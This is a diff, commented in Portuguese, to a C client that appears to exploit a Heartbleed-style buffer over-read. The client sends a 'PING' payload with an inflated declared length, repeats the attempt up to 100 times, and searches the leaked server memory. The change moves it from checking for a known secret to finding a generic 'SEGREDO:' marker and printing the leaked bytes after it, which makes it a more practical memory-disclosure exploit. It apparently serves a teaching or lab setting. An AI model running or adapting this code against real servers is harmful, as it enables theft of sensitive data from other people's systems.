@@ -13,10 +13,10 @@
 #define MAX_ATTEMPTS 100
 
 /*
- * Deve ser exatamente a mesma string definida no servidor.
- * Isso só será usado para teste.
+ * O atacante conhece apenas um marcador generico,
+ * nao o conteudo completo armazenado pelo servidor.
  */
-#define SECRET_VALUE "SEGREDO: ELES ESTAO DE OLHO EM NOS!"
+#define SECRET_MARKER "SEGREDO:"
 
 static void fail(const char *message) {
     perror(message);
@@ -65,24 +65,24 @@ static ssize_t receive_all(int socket_fd, void *buffer, size_t size) {
     return (ssize_t)received;
 }
 
-static int contains_secret(
+static ssize_t find_marker(
     const unsigned char *buffer,
     size_t buffer_size,
-    const char *secret
+    const char *marker
 ) {
-    size_t secret_size = strlen(secret);
+    size_t marker_size = strlen(marker);
 
-    if (secret_size > buffer_size) {
-        return 0;
+    if (marker_size > buffer_size) {
+        return -1;
     }
 
-    for (size_t i = 0; i <= buffer_size - secret_size; i++) {
-        if (memcmp(buffer + i, secret, secret_size) == 0) {
-            return 1;
+    for (size_t i = 0; i <= buffer_size - marker_size; i++) {
+        if (memcmp(buffer + i, marker, marker_size) == 0) {
+            return (ssize_t)i;
         }
     }
 
-    return 0;
+    return -1;
 }
 
 static void print_memory(const unsigned char *buffer, size_t size) {
@@ -100,6 +100,28 @@ static void print_memory(const unsigned char *buffer, size_t size) {
 
     for (size_t i = 0; i < size; i++) {
         putchar(isprint(buffer[i]) ? buffer[i] : '.');
+    }
+
+    printf("\n");
+}
+
+static void print_leaked_secret(
+    const unsigned char *buffer,
+    size_t buffer_size,
+    size_t start
+) {
+    printf("Conteudo descoberto: ");
+
+    for (size_t i = start; i < buffer_size; i++) {
+        if (buffer[i] == '\0') {
+            break;
+        }
+
+        if (isprint(buffer[i])) {
+            putchar(buffer[i]);
+        } else {
+            break;
+        }
     }
 
     printf("\n");
@@ -135,7 +157,7 @@ static int connect_to_server(void) {
     return socket_fd;
 }
 
-static int execute_attempt(unsigned char *response) {
+static ssize_t execute_attempt(unsigned char *response) {
     const char payload[] = "PING";
 
     uint16_t payload_size = (uint16_t)strlen(payload);
@@ -174,7 +196,7 @@ static int execute_attempt(unsigned char *response) {
 
     close(socket_fd);
 
-    return contains_secret(response, DECLARED_SIZE, SECRET_VALUE);
+    return find_marker(response, DECLARED_SIZE, SECRET_MARKER);
 }
 
 int main(void) {
@@ -187,9 +209,16 @@ int main(void) {
     for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
         printf("Tentativa %d de %d...\n", attempt, MAX_ATTEMPTS);
 
-        if (execute_attempt(response)) {
-            printf("\nString secreta encontrada na tentativa %d!\n", attempt);
-            printf("Segredo vazado: %s\n", SECRET_VALUE);
+        ssize_t marker_position = execute_attempt(response);
+
+        if (marker_position >= 0) {
+            printf("\nMarcador de dado sensivel encontrado na tentativa %d!\n", attempt);
+
+            print_leaked_secret(
+                response,
+                DECLARED_SIZE,
+                (size_t)marker_position
+            );
 
             print_memory(response, DECLARED_SIZE);
 
@@ -197,7 +226,7 @@ int main(void) {
             return EXIT_SUCCESS;
         }
 
-        printf("String secreta ainda nao encontrada.\n");
+        printf("Nenhum dado sensivel identificado nesta resposta.\n");
     }
 
     printf("\nLimite de tentativas atingido sem encontrar o segredo.\n");
